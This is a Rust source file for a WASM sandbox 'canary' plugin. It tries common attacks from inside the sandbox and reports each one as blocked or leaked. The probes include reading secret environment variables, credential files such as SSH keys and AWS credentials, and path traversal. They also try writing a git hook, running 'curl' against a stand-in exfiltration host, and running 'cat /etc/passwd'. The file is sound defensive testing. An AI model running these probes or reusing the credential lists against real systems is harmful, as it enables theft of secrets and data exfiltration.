#[link(wasm_import_module = "fledge")]
extern "C" {
    fn recv(ptr: *mut u8, max_len: i32) -> i32;
    fn send(ptr: *const u8, len: i32);
    fn exit(code: i32);
}

static mut PASS: u32 = 0;
static mut FAIL: u32 = 0;

fn fledge_recv_msg() -> Vec<u8> {
    let mut buf = vec![0u8; 65536];
    let len = unsafe { recv(buf.as_mut_ptr(), buf.len() as i32) };
    buf.truncate(len.max(0) as usize);
    buf
}

fn fledge_send_msg(msg: &str) {
    unsafe { send(msg.as_ptr(), msg.len() as i32) };
}

fn output(text: &str) {
    let mut escaped = String::with_capacity(text.len() + 32);
    for ch in text.chars() {
        match ch {
            '\\' => escaped.push_str("\\\\"),
            '"' => escaped.push_str("\\\""),
            '\n' => escaped.push_str("\\n"),
            '\t' => escaped.push_str("\\t"),
            _ => escaped.push(ch),
        }
    }
    fledge_send_msg(&format!(
        r#"{{"type":"output","text":"{escaped}"}}"#
    ));
}

fn pass(msg: &str) {
    unsafe { PASS += 1 };
    output(&format!("  \u{2713} BLOCKED: {msg}\n"));
}

fn fail(msg: &str) {
    unsafe { FAIL += 1 };
    output(&format!("  \u{2717} LEAKED: {msg}\n"));
}

fn header(title: &str) {
    output(&format!("\n=== {title} ===\n"));
}

// ---------------------------------------------------------------------------
// Test categories — mirrors the native canary's baseline tests
// ---------------------------------------------------------------------------

fn test_env_vars() {
    header("ENVIRONMENT VARIABLES");
    output("  Native canary inherits all parent env vars (GITHUB_TOKEN, etc).\n");
    output("  WASM guest should see nothing.\n\n");

    let sensitive = [
        "GITHUB_TOKEN",
        "GH_TOKEN",
        "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_ACCESS_KEY_ID",
        "DATABASE_URL",
        "FLEDGE_GITHUB_TOKEN",
        "NPM_TOKEN",
        "DOCKER_PASSWORD",
    ];

    for var in &sensitive {
        match std::env::var(var) {
            Ok(val) => {
                let preview = if val.len() > 3 { &val[..3] } else { &val };
                fail(&format!("{var} = {preview}*** (env var inherited!)"));
            }
            Err(_) => pass(&format!("{var} not in WASM environment")),
        }
    }

    // Also check general system vars
    for var in &["HOME", "PATH", "USER", "SHELL"] {
        match std::env::var(var) {
            Ok(val) => {
                let preview = if val.len() > 10 {
                    &val[..10]
                } else {
                    &val
                };
                fail(&format!("{var} = {preview}... (system var inherited!)"));
            }
            Err(_) => pass(&format!("{var} not in WASM environment")),
        }
    }

    let all_vars: Vec<_> = std::env::vars().collect();
    output(&format!(
        "\n  Total env vars visible: {} (native canary sees dozens)\n",
        all_vars.len()
    ));
    if !all_vars.is_empty() {
        output("  Visible vars:\n");
        for (k, _) in &all_vars {
            output(&format!("    {k}\n"));
        }
    }
}

fn test_filesystem_read() {
    header("FILESYSTEM ACCESS — READS");
    output("  Native canary reads ~/.ssh, ~/.aws, shell history, etc.\n");
    output("  WASM with filesystem=none should block all reads.\n\n");

    let paths = [
        ("/etc/hosts", "system file"),
        ("/etc/passwd", "user database"),
        ("/tmp", "temp directory listing"),
    ];

    for (path, desc) in &paths {
        match std::fs::read_to_string(path) {
            Ok(content) => fail(&format!(
                "{path} ({desc}) readable — {} bytes",
                content.len()
            )),
            Err(e) => pass(&format!("{path} ({desc}) — {e}")),
        }
    }

    // Credential files — try absolute paths for common home dirs
    output("\n  Credential file probes:\n\n");
    let cred_probes = [
        "/root/.ssh/id_ed25519",
        "/root/.ssh/id_rsa",
        "/root/.aws/credentials",
        "/root/.config/gh/hosts.yml",
        "/root/.git-credentials",
        "/root/.netrc",
        "/root/.npmrc",
        "/root/.kube/config",
        "/root/.docker/config.json",
        "/root/.zsh_history",
        "/root/.bash_history",
    ];

    for path in &cred_probes {
        match std::fs::read_to_string(path) {
            Ok(_) => fail(&format!("{path} readable from WASM!")),
            Err(e) => pass(&format!("{path} — {e}")),
        }
    }

    // Path traversal attempts
    output("\n  Path traversal probes:\n\n");
    let traversals = [
        "../../../etc/hosts",
        "../../../etc/passwd",
        "../../../../root/.ssh/id_ed25519",
        "../../.ssh/id_ed25519",
    ];

    for path in &traversals {
        match std::fs::read_to_string(path) {
            Ok(_) => fail(&format!("{path} — traversal succeeded!")),
            Err(e) => pass(&format!("{path} — {e}")),
        }
    }

    // Directory listing
    output("\n  Directory listing probes:\n\n");
    let dirs = ["/", "/tmp", "/home", "/Users", "/root", "/etc"];

    for dir in &dirs {
        match std::fs::read_dir(dir) {
            Ok(entries) => {
                let count = entries.count();
                fail(&format!("{dir}/ listable ({count} entries)"));
            }
            Err(e) => pass(&format!("{dir}/ listing — {e}")),
        }
    }
}

fn test_filesystem_write() {
    header("FILESYSTEM ACCESS — WRITES");
    output("  Native canary can write .git/hooks, shell RC files, LaunchAgents.\n");
    output("  WASM sandbox should block all writes.\n\n");

    let write_targets = [
        ("/tmp/canary-wasm-test", "temp directory"),
        ("canary-wasm-test", "working directory"),
        (".git/hooks/pre-commit", "git hook injection"),
    ];

    for (path, desc) in &write_targets {
        match std::fs::write(path, "canary-wasm-test") {
            Ok(_) => {
                let _ = std::fs::remove_file(path);
                fail(&format!("{path} ({desc}) writable!"));
            }
            Err(e) => pass(&format!("{path} ({desc}) — {e}")),
        }
    }
}

fn test_network() {
    header("NETWORK ACCESS");
    output("  Native canary has curl, wget, dig for exfiltration.\n");
    output("  WASM with network=false has no socket imports.\n\n");

    // std::net::TcpStream on wasm32-wasip1 returns Unsupported without WASI sockets
    match std::net::TcpStream::connect("8.8.8.8:53") {
        Ok(_) => fail("TCP to 8.8.8.8:53 connected!"),
        Err(e) => pass(&format!("TCP connect 8.8.8.8:53 — {e}")),
    }

    match std::net::TcpStream::connect("1.1.1.1:443") {
        Ok(_) => fail("TCP to 1.1.1.1:443 connected!"),
        Err(e) => pass(&format!("TCP connect 1.1.1.1:443 — {e}")),
    }

    output("\n  DNS exfiltration: no dig/nslookup (no process spawn, no sockets)\n");
    output("  HTTP exfiltration: no curl/wget (no process spawn, no sockets)\n");
}

fn test_process_spawn() {
    header("PROCESS SPAWNING");
    output("  Native canary can run any shell command (even with exec=false).\n");
    output("  WASM has no process API — WASI p1 does not support spawn.\n\n");

    match std::process::Command::new("echo").arg("pwned").output() {
        Ok(out) => fail(&format!(
            "echo ran: {}",
            String::from_utf8_lossy(&out.stdout).trim()
        )),
        Err(e) => pass(&format!("spawn echo — {e}")),
    }

    match std::process::Command::new("curl")
        .args(["https://evil.example.com/exfil"])
        .output()
    {
        Ok(_) => fail("curl command executed!"),
        Err(e) => pass(&format!("spawn curl — {e}")),
    }

    match std::process::Command::new("crontab")
        .arg("-l")
        .output()
    {
        Ok(_) => fail("crontab accessible!"),
        Err(e) => pass(&format!("spawn crontab — {e}")),
    }

    match std::process::Command::new("cat")
        .arg("/etc/passwd")
        .output()
    {
        Ok(_) => fail("cat /etc/passwd ran!"),
        Err(e) => pass(&format!("spawn cat — {e}")),
    }
}

fn test_clipboard() {
    header("CLIPBOARD / SYSTEM INFO");
    output("  Native canary reads clipboard (pbpaste), ps aux, hostname.\n");
    output("  WASM cannot spawn processes or access system APIs.\n\n");

    match std::process::Command::new("pbpaste").output() {
        Ok(_) => fail("pbpaste accessible!"),
        Err(e) => pass(&format!("pbpaste — {e}")),
    }

    match std::process::Command::new("ps")
        .arg("aux")
        .output()
    {
        Ok(_) => fail("ps aux ran!"),
        Err(e) => pass(&format!("ps aux — {e}")),
    }

    match std::process::Command::new("whoami").output() {
        Ok(_) => fail("whoami ran!"),
        Err(e) => pass(&format!("whoami — {e}")),
    }
}

fn main() {
    // Protocol: receive init message from fledge host
    let _init = fledge_recv_msg();

    output("fledge-plugin-canary-wasm v0.6.0\n");
    output("Runtime: WASM (wasm32-wasip1, Wasmtime sandbox)\n");
    output("Capabilities: filesystem=none, network=false, exec=false, store=false\n");
    output("Testing same attacks as native canary from inside the sandbox...\n");

    test_env_vars();
    test_filesystem_read();
    test_filesystem_write();
    test_network();
    test_process_spawn();
    test_clipboard();

    // Summary
    let (p, f) = unsafe { (PASS, FAIL) };
    let total = p + f;
    header("SUMMARY");
    output(&format!("  {total} tests: {p} blocked, {f} leaked\n"));

    if f == 0 {
        output("\n  RESULT: All attacks BLOCKED by WASM sandbox.\n");
        output("  The same attacks SUCCEED in the native canary (try: fledge canary baseline).\n\n");
        output("  Why it works:\n");
        output("    - No preopened directories = filesystem calls have nothing to open\n");
        output("    - No env var inheritance = secrets stay outside the guest\n");
        output("    - No socket imports linked = network calls fail at the WASI layer\n");
        output("    - No process API in WASI p1 = cannot spawn shell commands\n");
        output("    - Enforcement is structural, not a runtime check that could be bypassed\n");
    } else {
        output(&format!("\n  WARNING: {f} attacks succeeded inside WASM sandbox!\n"));
        output("  This indicates a sandbox escape — investigate immediately.\n");
    }

    output("\n");
    unsafe { exit(if f == 0 { 0 } else { 1 }) };
    unreachable!();
}
